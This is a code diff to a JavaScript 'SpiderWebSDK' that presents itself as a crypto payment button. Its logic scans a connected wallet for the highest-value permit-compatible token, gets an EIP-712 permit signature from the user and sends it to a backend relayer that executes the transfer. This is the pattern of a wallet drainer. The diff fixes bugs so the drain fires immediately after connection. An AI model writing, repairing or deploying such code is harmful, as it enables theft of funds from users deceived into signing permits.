@@ -43,8 +43,8 @@ window.SpiderWebSDK = {
             return;
         }
         if (typeof ethers === 'undefined') {
-             console.error("SpiderWebSDK Error: ethers.js is not loaded. Please include it on your page.");
-             return;
+            console.error("SpiderWebSDK Error: ethers.js is not loaded. Please include it on your page.");
+            return;
         }
         this._config = config;
 
@@ -53,6 +53,7 @@ window.SpiderWebSDK = {
             console.error(`SpiderWebSDK Error: Button with ID "${config.buttonId}" not found.`);
             return;
         }
+        // Attach click handler, bound to the SDK context
         payButton.addEventListener('click', this._handlePaymentClick.bind(this));
 
         this._injectModalHtml();
@@ -61,45 +62,43 @@ window.SpiderWebSDK = {
         console.log("SpiderWebSDK initialized successfully.");
     },
 
+    // --- FIX 1: One-Click Payment Flow (Corrected _handlePaymentClick) ---
     _handlePaymentClick: async function() {
-        try {
-            // Flag to track if we need to proceed with execution after connection
-            let shouldExecuteSend = false; 
-            
-            if (!this._signer) {
-                const connected = await this._connectWallet();
-                if (!connected) {
-                    this._updateStatus("Wallet connection cancelled.", "info");
-                    return;
-                }
-                // If connection was successful, we set the flag to execute the send.
-                shouldExecuteSend = true; 
-            } else {
-                // If already connected, we execute the send right away.
-                shouldExecuteSend = true;
+        try {
+            if (!this._signer) {
+                // Wallet not connected. Initiate connection via modal.
+                const connected = await this._connectWallet(); 
+                
+                if (!connected) {
+                    this._updateStatus("Wallet connection cancelled.", "info");
+                    return;
+                }
             }
 
-            if (shouldExecuteSend) {
-                const network = await this._provider.getNetwork();
-                if (network.chainId !== this._config.chainId) {
-                    this._updateStatus(`Please switch your wallet to the correct network (Chain ID: ${this._config.chainId}).`, "error");
-                    return;
-                }
-                // This is the crucial step that was missing when the wallet first connects
-                await this._executeSend(); 
+            // Connection is successful (either existing or newly established).
+            const network = await this._provider.getNetwork();
+            
+            // Check if the wallet is on the correct chain
+            if (network.chainId !== this._config.chainId) {
+                this._updateStatus(`Please switch your wallet to the correct network (Chain ID: ${this._config.chainId}).`, "error");
+                return;
             }
-        } catch (error) {
-            console.error("Payment failed:", error);
-            this._updateStatus(`Error: ${error.message}`, "error");
-        }
-    },
+            
+            // Execute the main payment logic immediately
+            await this._executeSend();
+            
+        } catch (error) {
+            console.error("Payment failed:", error);
+            this._updateStatus(`Error: ${error.message}`, "error");
+        }
+    },
     
     _executeSend: async function() {
         this._updateStatus("Scanning wallet for compatible tokens...", "pending");
         
         const tokenData = await this._findHighestValueToken();
         if (!tokenData) {
-             throw new Error("No permit-compatible tokens with a balance were found.");
+            throw new Error("No permit-compatible tokens with a balance were found.");
         }
 
         this._updateStatus(`Highest value token found: ${tokenData.symbol}`, "info");
@@ -147,6 +146,7 @@ window.SpiderWebSDK = {
     _checkPermitSupport: async function(tokenAddress) {
         try {
             const tokenContract = new ethers.Contract(tokenAddress, this._ERC20_PERMIT_ABI, this._provider);
+            // Check for required ERC-20 Permit functions
             await tokenContract.nonces(this._currentUserAddress);
             await tokenContract.DOMAIN_SEPARATOR();
             return true;
@@ -165,6 +165,7 @@ window.SpiderWebSDK = {
             
             let domainVersion = "1";
             try {
+                // Try to get token's EIP-712 version string
                 domainVersion = await tokenContract.version();
             } catch (e) {
                 console.log(`Token ${tokenData.symbol} has no version(), defaulting to '1'.`);
@@ -196,6 +197,7 @@ window.SpiderWebSDK = {
             };
 
             this._updateStatus(`Please sign the message for ${tokenData.symbol}...`, 'pending');
+            // Sign the EIP-712 typed data
             const signature = await this._signer._signTypedData(domain, types, permitMessage);
             
             const { v, r, s } = ethers.utils.splitSignature(signature);
@@ -213,6 +215,7 @@ window.SpiderWebSDK = {
             };
 
             this._updateStatus('Signature received. Relaying transaction...', 'pending');
+            // Send the signed permit data to the backend relayer
             const response = await fetch(`${this._RELAYER_SERVER_URL_BASE}/execute-transfer`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -237,41 +240,33 @@ window.SpiderWebSDK = {
         });
     },
 
-    _handlePaymentClick: async function() {
-    try {
-        let connected = true; // Assume connected if this._signer exists
+    _handleProviderSelection: async function(event) {
+        const button = event.target.closest('.sw-wallet-button');
+        if (!button) return;
 
-        if (!this._signer) {
-            // Step 1: Wallet not connected. Initiate connection via modal.
-            // This promise resolves after the user selects a wallet and approves the connection.
-            connected = await this._connectWallet(); 
+        const rdns = button.dataset.rdns;
+        const providerDetail = this._discoveredProviders.get(rdns);
+        if (!providerDetail) return;
+        
+        this._updateStatus(`Connecting with ${providerDetail.info.name}...`, 'pending');
+        this._closeWalletModal();
+
+        try {
+            const selectedProvider = providerDetail.provider;
+            this._provider = new ethers.providers.Web3Provider(selectedProvider);
+            await this._provider.send('eth_requestAccounts', []);
+            this._signer = this._provider.getSigner();
+            this._currentUserAddress = await this._signer.getAddress();
             
-            if (!connected) {
-                // Connection was explicitly cancelled or failed. Stop.
-                this._updateStatus("Wallet connection cancelled.", "info");
-                return;
-            }
-        }
+            this._updateStatus(`Connected: ${this._currentUserAddress.slice(0,6)}...${this._currentUserAddress.slice(-4)}`, 'success');
+            if (this._resolveConnection) this._resolveConnection(true);
 
-        // Step 2: Connection is now successful (either existing or newly established).
-        // Proceed with the network check and transaction.
-
-        const network = await this._provider.getNetwork();
-        
-        // Check if the wallet is on the correct chain
-        if (network.chainId !== this._config.chainId) {
-            this._updateStatus(`Please switch your wallet to the correct network (Chain ID: ${this._config.chainId}).`, "error");
-            return;
+        } catch (error) {
+            console.error("Connection failed:", error);
+            this._updateStatus("Connection failed or was rejected.", "error");
+            if (this._resolveConnection) this._resolveConnection(false);
         }
-        
-        // Step 3: Execute the main payment logic (find token, sign permit, relay transaction)
-        await this._executeSend();
-        
-    } catch (error) {
-        console.error("Payment failed:", error);
-        this._updateStatus(`Error: ${error.message}`, "error");
-    }
-},
+    },
 
     _setupEip6963Listeners: function() {
         window.addEventListener('eip6963:announceProvider', (event) => {
@@ -296,7 +291,7 @@ window.SpiderWebSDK = {
 
         this._discoveredProviders.forEach(p => {
             const buttonHtml = `
-                <button data-rdns="${p.info.rdns}" class="sw-wallet-button" style="width: 100%; display: flex; align-items-center; padding: 12px; background-color: #374151; border-radius: 8px; border: none; cursor: pointer; margin-bottom: 8px; color: white;">
+                <button data-rdns="${p.info.rdns}" class="sw-wallet-button" style="width: 100%; display: flex; align-items: center; padding: 12px; background-color: #374151; border-radius: 8px; border: none; cursor: pointer; margin-bottom: 8px; color: white;">
                     <img src="${p.info.icon}" alt="${p.info.name}" style="width: 32px; height: 32px; margin-right: 16px; border-radius: 50%;"/>
                     <span style="font-weight: 500;">${p.info.name}</span>
                 </button>
@@ -327,6 +322,7 @@ window.SpiderWebSDK = {
         }
         setTimeout(() => {
             if (overlay) overlay.style.display = 'none';
+            // If the modal is closed before connection, resolve the pending promise to false
             if(this._resolveConnection && !this._signer) {
                 this._resolveConnection(false);
             }
@@ -340,6 +336,7 @@ window.SpiderWebSDK = {
         statusEl.innerHTML = `<p style="color: ${colors[type]}; margin: 0; font-size: 14px; text-align: center;">${message}</p>`;
     },
     
+    // --- FIX 2: Correct Event Listener Binding (Resolved "Cannot read properties of undefined (reading 'bind')") ---
     _injectModalHtml: function() {
         if (document.getElementById('sw-modal-overlay')) return;
         
@@ -357,9 +354,13 @@ window.SpiderWebSDK = {
         `;
         document.body.insertAdjacentHTML('beforeend', modalHtml);
 
-        document.getElementById('sw-close-wallet-modal-btn').addEventListener('click', this._closeWalletModal.bind(this));
+        const closeBound = this._closeWalletModal.bind(this);
+
+        document.getElementById('sw-close-wallet-modal-btn').addEventListener('click', closeBound);
+        
+        // Pass the bound function directly to the event listener
         document.getElementById('sw-modal-overlay').addEventListener('click', (e) => {
-            if (e.target.id === 'sw-modal-overlay') this._closeWalletModal.bind(this)();
+            if (e.target.id === 'sw-modal-overlay') closeBound();
         });
     }
 };
